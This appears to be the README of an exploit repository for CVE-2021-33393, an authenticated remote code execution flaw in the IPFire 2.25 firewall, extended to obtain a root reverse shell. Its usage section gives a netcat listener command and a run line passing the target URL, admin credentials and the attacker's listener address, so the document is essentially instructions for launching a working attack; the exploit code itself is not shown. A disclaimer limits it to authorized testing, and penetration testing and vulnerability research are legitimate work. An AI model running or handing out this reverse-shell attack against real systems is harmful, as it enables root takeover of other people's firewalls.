# IPFire 2.25 Remote Code Execution (Authenticated) - CVE-2021-33393
This exploit is based on CVE-2021-33393 (https://nvd.nist.gov/vuln/detail/CVE-2021-33393) and was built upon the original exploit by Mücahit Saratar (https://github.com/KaanaryOverFlow/ipfire-2-25-auth-rce), extending it to achieve a reverse shell with root privileges.

## Usage
Start a listener:
`nc -lvnp 4444`

Run the exploit:
`python exploit.py https://192.168.0.10:444 admin 'admin@123' 192.168.0.11:4444`

## Disclaimer
This exploit is for educational purposes and authorized penetration testing only.
Do not use against systems you do not have explicit permission to test.
The author is not responsible for misuse.
